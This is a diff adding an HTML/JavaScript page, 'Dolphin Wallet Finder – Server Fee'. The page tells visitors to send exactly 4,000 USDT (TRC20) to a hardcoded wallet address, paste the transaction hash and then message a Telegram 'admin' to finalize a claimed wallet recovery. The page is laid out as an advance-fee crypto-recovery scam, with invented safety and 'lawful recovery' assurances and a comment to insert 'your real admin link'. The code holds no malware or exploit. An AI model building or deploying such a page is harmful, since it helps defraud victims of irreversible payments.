@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Server Fee — Dolphin Wallet Finder</title>
+  <style>
+  :root{
+    --c1:#0ff1e7; --c2:#35a7ff; --c3:#14ff89;
+    --grid:#0e1628;
+    --panel:rgba(10,16,26,.70); --panel2:rgba(6,12,20,.60);
+    --stroke:rgba(64,203,255,.28); --dash:rgba(32,205,255,.20);
+    --muted:rgba(190,245,255,.85); --text:#eafaff;
+    --shadow-lg:0 28px 90px rgba(0,0,0,.65);
+  }
+  *{box-sizing:border-box}
+  html,body{height:100%}
+  body{
+    margin:0; color:var(--text);
+    font-family:Inter, system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
+    background:
+      radial-gradient(1400px 820px at 15% 10%, rgba(53,167,255,.12), transparent 60%),
+      radial-gradient(1100px 680px at 85% 90%, rgba(20,255,137,.12), transparent 60%),
+      linear-gradient(180deg,#0a1220,var(--grid) 42%);
+    overflow-x:hidden; -webkit-tap-highlight-color:transparent;
+  }
+
+  .radar{position:fixed; inset:0; z-index:-2}
+  canvas{position:absolute; inset:0; width:100%; height:100%}
+
+  .stage{min-height:100%; display:grid; place-items:center; padding:clamp(16px,3vw,32px); position:relative; z-index:2}
+  .shell{
+    width:min(1200px,98vw); min-height:560px; display:grid; grid-template-columns:1.05fr 1.45fr;
+    border-radius:28px; overflow:hidden; isolation:isolate; position:relative;
+    box-shadow:var(--shadow-lg); border:1px solid var(--stroke);
+  }
+  @media (max-width:980px){ .shell{ grid-template-columns:1fr } }
+
+  .brand-pane{
+    position:relative;
+    background:
+      radial-gradient(900px 600px at 20% 10%, rgba(53,167,255,.22), transparent 60%),
+      radial-gradient(700px 520px at 100% 100%, rgba(20,255,137,.20), transparent 65%),
+      linear-gradient(180deg, rgba(12,22,36,.88), rgba(8,16,28,.78));
+    backdrop-filter: blur(18px) saturate(120%);
+    border-right:1px solid rgba(64,203,255,.18);
+    overflow:hidden;
+  }
+  .brand-inner{ padding:34px; height:100%; display:flex; flex-direction:column; justify-content:space-between }
+  .logo-wrap{ position:relative; width:min(240px,42vw); aspect-ratio:1/1; filter: drop-shadow(0 18px 42px rgba(53,167,255,.45)); }
+  .ring{ position:absolute; inset:-12%; border-radius:50%;
+    background:conic-gradient(from 0deg, rgba(53,167,255,.75), transparent 20%, rgba(15,241,231,.75), transparent 70%);
+    filter:blur(12px); animation:spin 8s linear infinite; opacity:.9;
+  }
+  .title{ margin:14px 0 6px; font-weight:900; font-size:clamp(22px,2.2vw,30px);
+    background:linear-gradient(90deg,var(--c2),var(--c1),var(--c3)); -webkit-background-clip:text; color:transparent; }
+  .kicker{ color:var(--muted); line-height:1.8 }
+
+  .content-pane{ background:linear-gradient(180deg,var(--panel),var(--panel2)); backdrop-filter: blur(18px) saturate(120%); position:relative; }
+  .border-glow{ position:absolute; inset:-1.5px; border-radius:30px; z-index:-1; background:conic-gradient(from 0deg, transparent, rgba(53,167,255,.55), transparent 40%, rgba(15,241,231,.55), transparent 75%); filter:blur(8px); animation:spin 14s linear infinite; }
+  .pane-inner{ padding:28px clamp(24px,4vw,38px); display:flex; flex-direction:column; gap:18px; height:100% }
+
+  .hero h2{ margin:0; font-size:clamp(22px,2.4vw,32px); font-weight:900; background:linear-gradient(90deg,var(--c2),var(--c1),var(--c3)); -webkit-background-clip:text; color:transparent }
+  .hero p{ color:var(--muted); line-height:1.9; margin:0 }
+
+  .grid{ display:grid; grid-template-columns:1fr 1fr; gap:16px; margin-top:6px }
+  @media (max-width:980px){ .grid{ grid-template-columns:1fr } }
+  .card{ background:linear-gradient(110deg,rgba(0,255,255,.08),rgba(0,40,110,.13)); border:1px solid rgba(64,203,255,.28); border-radius:16px; padding:18px; display:flex; gap:10px; }
+
+  .label{ color:var(--muted); font-size:.95rem }
+  .mono-box{
+    width:100%; padding:14px 16px; border-radius:14px;
+    background:linear-gradient(120deg,rgba(0,255,255,.06),rgba(0,35,80,.10));
+    border:1px dashed var(--dash); color:var(--text); font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", monospace;
+    word-break:break-all
+  }
+  .row{ display:flex; gap:10px; flex-wrap:wrap }
+  .btn{ border:none; border-radius:14px; padding:12px 18px; font-weight:800; letter-spacing:.3px; cursor:pointer; background:linear-gradient(95deg,var(--c2),var(--c1)); color:#001019; box-shadow:0 10px 28px rgba(53,167,255,.28); }
+  .btn:hover{ transform:translateY(-1px) }
+  .btn[disabled]{ opacity:.5; filter:grayscale(.4); cursor:not-allowed }
+  .btn-ghost{ border:1px solid rgba(64,203,255,.28); background:linear-gradient(120deg,rgba(0,255,255,.06),rgba(0,35,80,.10)); color:var(--text); border-radius:14px; padding:12px 18px; font-weight:800; letter-spacing:.3px; cursor:pointer; }
+  .copy-note{ font-size:.9rem; color:#9fd; margin-top:6px }
+  .fee{ display:flex; align-items:center; justify-content:space-between; gap:12px; flex-wrap:wrap; background:linear-gradient(120deg,rgba(0,255,255,.06),rgba(0,35,80,.10)); border:1px dashed var(--dash); padding:12px 14px; border-radius:12px; margin:8px 0 14px }
+  .fee strong{ font-size:1.15rem }
+
+  .foot{ margin-top:auto; text-align:center; color:var(--muted); font-size:.9rem }
+
+  .logo-wrap img{ width:100%; height:100%; object-fit:contain; display:block; }
+  @media (max-width: 600px){ .logo-wrap{ width:min(180px,60vw); margin:0 auto; } }
+
+  @keyframes spin{ to{ transform:rotate(1turn) } }
+  </style>
+</head>
+<body>
+  <div class="radar" aria-hidden="true"></div>
+
+  <main class="stage">
+    <section class="shell" role="region" aria-label="Server Fee Panel">
+
+      <!-- LEFT / BRAND -->
+      <aside class="brand-pane">
+        <div class="brand-inner">
+          <div>
+            <div class="logo-wrap" aria-hidden="true">
+              <div class="ring"></div>
+              <img src="../assets/logo.png" alt="Dolphin Wallet Logo" />
+            </div>
+            <h1 class="title">Dolphin Wallet Finder</h1>
+            <p class="kicker">Manual confirmation by admin for the server fee step. Use (TRC20) only.</p>
+          </div>
+        </div>
+      </aside>
+
+      <!-- RIGHT / CONTENT -->
+      <section class="content-pane">
+        <div class="border-glow"></div>
+        <div class="pane-inner">
+
+          <header class="hero">
+            <h2>Server Fee</h2>
+            <p>Pay exactly <strong>4,000 USDT (TRC20)</strong> and submit your TX hash for manual approval.</p>
+          </header>
+
+          <div class="grid">
+            <!-- Payment / Left card -->
+            <section class="card" style="flex-direction:column">
+              <div class="label">Payment Details</div>
+              <div class="fee">
+                <div>Server Fee</div>
+                <strong>4,000 USDT (TRC20)</strong>
+              </div>
+
+              <div class="mono-box" id="usdtAddress">Loading…</div>
+              <div class="row" style="margin-top:10px">
+                <button class="btn" id="copyBtn" type="button">Copy Address</button>
+                <button class="btn-ghost" id="netInfoBtn" type="button">Network: TRON (TRC20)</button>
+              </div>
+              <div class="copy-note" id="copyNote">Use only USDT on TRON (TRC20). Sending other assets will be lost.</div>
+
+              <div class="label" style="margin-top:16px">Submit Your Transaction</div>
+              <div class="row">
+                <input class="mono-box" style="padding:12px 14px" id="txHash" placeholder="Paste your payment TX hash here..." />
+                <button class="btn-ghost" id="validateBtn" type="button">Validate</button>
+              </div>
+
+              <label style="display:flex; gap:10px; align-items:flex-start; margin-top:10px; font-size:.9rem; color:#aef;">
+                <input type="checkbox" id="confirmPaid" style="margin-top:4px; accent-color:#14ff89;">
+                I confirm that I sent <strong>4,000 USDT (TRC20)</strong> to the address above.
+              </label>
+
+              <div class="row" style="margin-top:10px">
+                <button class="btn" id="openTelegramBtn" disabled>Open Telegram Admin</button>
+              </div>
+
+              <div class="copy-note" style="margin-top:8px">
+                After payment: paste your TX Hash, check the confirmation box, and then click
+                <em>Open Telegram Admin</em>. Share your TX Hash with the admin to finalize.
+              </div>
+            </section>
+
+            <!-- Security / Right card -->
+            <aside class="card" style="flex-direction:column">
+              <div class="label">Why Manual Admin Confirmation?</div>
+              <div class="mono-box" style="line-height:1.8">
+                <strong>Maximum Safety</strong> — sensitive steps are supervised by a human admin. No automated private-key exposure.
+                <br><br>
+                <strong>Anti‑Hijack Workflow</strong> — manual review prevents malicious rerouting or phishing during high‑value recoveries.
+                <br><br>
+                <strong>Traceable & Auditable</strong> — every paid TX hash and session is verifiable, reducing the risk of fraud.
+                <br><br>
+                <em>We never ask for your private keys. The engine searches public chains and coordinates lawful recovery.</em>
+              </div>
+            </aside>
+          </div>
+        </div>
+        <div class="foot">© 2025 DOLPHIN WALLET FINDER. All rights reserved.</div>
+      </section>
+    </section>
+  </main>
+
+<script>
+  // ======== Config ========
+  const TELEGRAM_ADMIN_URL = "https://t.me/Mh128102"; // <-- change to your real admin link
+  const USDT_ADDRESS = "TWWKr8K7pZuXTHK6ogVwZ7kAN5mVLHMmpp"; // TRC20 address
+  document.getElementById("usdtAddress").textContent = USDT_ADDRESS;
+
+  // ======== UI refs ========
+  const copyBtn = document.getElementById("copyBtn");
+  const netInfoBtn = document.getElementById("netInfoBtn");
+  const openTelegramBtn = document.getElementById("openTelegramBtn");
+  const txHashInput = document.getElementById("txHash");
+  const confirmPaid = document.getElementById("confirmPaid");
+  const copyNote = document.getElementById("copyNote");
+
+  // Copy address
+  copyBtn.addEventListener("click", async () => {
+    try {
+      await navigator.clipboard.writeText(USDT_ADDRESS);
+      const old = copyBtn.textContent;
+      copyBtn.textContent = "Copied!";
+      setTimeout(()=> copyBtn.textContent = old, 1600);
+    } catch (e) {
+      copyNote.textContent = "Copy failed. Long-press or select the address manually.";
+      copyNote.style.color = "#f99";
+      setTimeout(()=> { copyNote.textContent = "Use only USDT on TRON (TRC20). Sending other assets will be lost."; copyNote.style.color="#9fd"; }, 2200);
+    }
+  });
+
+  // Simple helper: TX-ish format check (not on-chain validation)
+  function looksLikeHash(v){
+    return /^[a-zA-Z0-9]{30,120}$/.test((v||"").trim());
+  }
+
+  // Validate button (client-side pre-check)
+  document.getElementById("validateBtn").addEventListener("click", () => {
+    const v = txHashInput.value.trim();
+    if (!v){
+      alert("Please paste your payment transaction hash first.");
+      return;
+    }
+    if (!looksLikeHash(v)){
+      alert("This doesn't look like a valid TX hash format. Please double-check.");
+      return;
+    }
+    alert("Looks good! Now check the confirmation box to enable the Telegram button.");
+  });
+
+  // Gate to open Telegram: need both tx hash & confirmed checkbox
+  function checkGate(){
+    const ok = confirmPaid.checked && looksLikeHash(txHashInput.value);
+    openTelegramBtn.disabled = !ok;
+  }
+  confirmPaid.addEventListener("change", checkGate);
+  txHashInput.addEventListener("input", checkGate);
+
+  // Open Telegram (no auto-redirects)
+  openTelegramBtn.addEventListener("click", () => {
+    sessionStorage.setItem("server_fee_tx_hash", txHashInput.value.trim());
+    window.open(TELEGRAM_ADMIN_URL, "_blank", "noopener");
+  });
+
+  // Network info helper
+  netInfoBtn.addEventListener("click", () => {
+    alert("Network: TRON (TRC20)\n\nSend exactly 4,000 USDT to the address shown. Using another chain or token will result in permanent loss.");
+  });
+
+</script>
+</body>
+</html>
+
